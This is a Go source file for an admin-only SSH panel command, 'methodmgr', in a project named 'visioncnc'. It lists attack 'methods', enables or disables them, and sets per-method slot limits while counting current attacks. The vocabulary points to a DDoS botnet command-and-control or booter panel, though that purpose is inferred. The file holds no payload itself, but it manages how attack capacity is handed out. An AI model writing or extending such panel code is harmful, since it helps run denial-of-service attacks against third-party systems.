package cmds

import (
	"fmt"
	"io"
	"strconv"
	"strings"
	"visioncnc/database"
	"visioncnc/utils"

	"github.com/gliderlabs/ssh"
)

// MethodCommand lets admins enable/disable methods and change slot limits from the panel
type MethodCommand struct{}

func (c *MethodCommand) Name() string        { return "methodmgr" }
func (c *MethodCommand) AdminOnly() bool      { return true }
func (c *MethodCommand) Aliases() []string    { return []string{"mmgr"} }

func (c *MethodCommand) Execute(session ssh.Session, db *database.Database, args []string, output io.Writer) {
	theme := utils.GetTheme()

	if len(args) == 0 {
		fmt.Fprintln(output, "Usage: methodmgr <list|enable|disable|slots> [name] [value]")
		return
	}

	switch strings.ToLower(args[0]) {
	case "list":
		methods := utils.GetMethodsList()
		if len(methods) == 0 {
			fmt.Fprintln(output, theme.Colors.Warning+"No methods loaded."+theme.Colors.Reset)
			return
		}
		fmt.Fprintf(output, "%-18s %-8s %-8s %s\n", "Method", "Group", "Enabled", "Slots (used/max)")
		fmt.Fprintln(output, strings.Repeat("─", 52))
		for _, m := range methods {
			used := db.GetCurrentAttacksLength2(m.Method)
			status := theme.Colors.Success + "yes" + theme.Colors.Reset
			if !m.Enabled {
				status = theme.Colors.Error + "no " + theme.Colors.Reset
			}
			fmt.Fprintf(output, "%-18s %-8s %s      %d/%d\n",
				m.Method, m.Group, status, used, m.Slots)
		}

	case "enable":
		if len(args) < 2 {
			fmt.Fprintln(output, "Usage: methodmgr enable <name>")
			return
		}
		if err := utils.SetMethodEnabled(args[1], true); err != nil {
			fmt.Fprintf(output, "%sError: %v%s\n", theme.Colors.Error, err, theme.Colors.Reset)
			return
		}
		fmt.Fprintf(output, "%sMethod '%s' enabled.%s\n", theme.Colors.Success, args[1], theme.Colors.Reset)

	case "disable":
		if len(args) < 2 {
			fmt.Fprintln(output, "Usage: methodmgr disable <name>")
			return
		}
		if err := utils.SetMethodEnabled(args[1], false); err != nil {
			fmt.Fprintf(output, "%sError: %v%s\n", theme.Colors.Error, err, theme.Colors.Reset)
			return
		}
		fmt.Fprintf(output, "%sMethod '%s' disabled.%s\n", theme.Colors.Success, args[1], theme.Colors.Reset)

	case "slots":
		if len(args) < 3 {
			fmt.Fprintln(output, "Usage: methodmgr slots <name> <number>")
			return
		}
		n, err := strconv.Atoi(args[2])
		if err != nil || n < 0 {
			fmt.Fprintf(output, "%sInvalid slot count: %s%s\n", theme.Colors.Error, args[2], theme.Colors.Reset)
			return
		}
		if err := utils.SetMethodSlots(args[1], n); err != nil {
			fmt.Fprintf(output, "%sError: %v%s\n", theme.Colors.Error, err, theme.Colors.Reset)
			return
		}
		fmt.Fprintf(output, "%sSlots for '%s' set to %d.%s\n", theme.Colors.Success, args[1], n, theme.Colors.Reset)

	default:
		fmt.Fprintln(output, "Usage: methodmgr <list|enable|disable|slots> [name] [value]")
	}
}

func init() {
	CommandMap["methodmgr"] = &MethodCommand{}
}
